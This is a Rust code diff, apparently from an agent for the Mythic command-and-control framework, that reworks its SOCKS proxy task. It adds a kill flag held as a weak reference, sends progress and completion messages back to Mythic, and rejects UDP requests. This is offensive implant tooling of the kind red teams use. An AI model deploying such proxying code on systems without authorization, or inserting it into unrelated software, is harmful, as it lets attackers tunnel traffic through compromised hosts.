@@ -1,7 +1,7 @@
-use crate::mythic_error;
+use crate::{mythic_error, mythic_success, mythic_continued};
 use std::result::Result;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::mpsc;
+use std::sync::{mpsc, Weak};
 use std::{error::Error, sync::Arc};
 use serde_json::Value;
 use tokio::{
@@ -61,21 +61,31 @@ pub fn task_socks(
 
             // Create a new flag indicating that the task is running
             let running = Arc::new(AtomicBool::new(true));
-            let running_ref = running.clone();
+            let keep_running = Arc::downgrade(&running);
 
             let ttx = tx.clone();
+
+            tx.send(mythic_continued!(
+                uuid,
+                "SOCKS ready",
+                "SOCKS ready"
+            ))?;
 
             // Spawn a new thread for the background task
             std::thread::spawn(move || {
                 // Invoke the callback function
-                if let Err(e) = setup_socks(snd_to_mythic, recv_from_mythic) {
+                if let Err(e) = setup_socks(snd_to_mythic, recv_from_mythic, keep_running.clone()) {
                     // If the function returns an error, relay the error message back to Mythic
                     let _ = ttx.send(mythic_error!(uuid, e.to_string()));
+                }else{
+                    let _ = ttx.send(mythic_success!(uuid, "SOCKS finished"));
                 }
                 // Once the task ends, mark it as not running
-                running_ref.store(false, Ordering::SeqCst);
+                if let Some(running) = keep_running.upgrade() {
+                    running.store(false, Ordering::SeqCst);
+                }
             });
-
+    
             // Append this new task to the Vec of background tasks
             Ok(Some(
                 (
@@ -96,6 +106,7 @@ pub fn task_socks(
 fn setup_socks(
     snd_to_mythic: Sender<SocksMsg>,
     mut recv_from_mythic: Receiver<SocksMsg>,
+    keep_running: Weak<AtomicBool>
 ) -> Result<(), Box<dyn Error>> {
     // Initialize a new async runtime
     let rt = Runtime::new()?;
@@ -106,6 +117,10 @@ fn setup_socks(
         
         // Loop continuously until the sender (from mythic) is droped
         loop {
+            if keep_running.strong_count() == 0 {
+                //background task was killed
+                break;
+            }
             let msg = if let Some(msg) = recv_from_mythic.recv().await {
                 msg
             }else{
@@ -138,7 +153,8 @@ fn setup_socks(
                 let jh = tokio::spawn(connect_request(id,
                     snd_to_mythic.clone(),
                     data,
-                    client_sockets.clone()));
+                    client_sockets.clone(),
+                    keep_running.clone()));
                 client_sockets.lock().await.insert(id, Client::Connecting(jh));
             }
             if msg.exit {
@@ -183,7 +199,8 @@ enum Client {
 async fn connect_request(id: usize,
     backend_w: Sender<SocksMsg>,
     mut data: Vec<u8>,
-    client_sockets: Arc<Mutex<HashMap<usize, Client>>>
+    client_sockets: Arc<Mutex<HashMap<usize, Client>>>,
+    keep_running: Weak<AtomicBool>
 ) {
     //socks auth is done by mythic (no auth)
     //now process the connect request
@@ -195,11 +212,10 @@ async fn connect_request(id: usize,
             
             client_sockets.lock().await.insert(id, Client::Connected(cwrite));
 
-            read_from_client(id, client_r, &backend_w).await;
+            read_from_client(id, client_r, &backend_w, keep_running).await;
         }
         Err(socks_err_no) => {
-            write_mplx_data(id, false, &[5, socks_err_no], &backend_w).await.expect("link down");
-            write_mplx_data(id, true, &[], &backend_w).await.expect("link down");
+            write_mplx_data(id, true, &[5, socks_err_no], &backend_w).await.expect("link down");
         }
     }
 }
@@ -284,13 +300,24 @@ async fn socks_connect(data: &[u8]) -> Result<TcpStream, u8> {
             //2. the connecting client
             Err(7)
         },
+        3 => { //UDP
+            Err(7)
+        },
         _ => Err(7)
     }
 }
 /// read data from the local connection and send it to mythic
-async fn read_from_client(id:usize, mut client_r : ReadHalf<TcpStream>, backend_w: &Sender<SocksMsg>) {
+async fn read_from_client(
+    id:usize,
+    mut client_r : ReadHalf<TcpStream>,
+    backend_w: &Sender<SocksMsg>,
+    keep_running: Weak<AtomicBool>) {
     let mut buffer : [u8; 8192] = [0; 8192];
     loop {
+        if keep_running.strong_count() == 0 {
+            //background task was killed
+            break;
+        }
         let n = match client_r.read(&mut buffer).await {
             Ok(0) => break,
             Ok(n) => n,
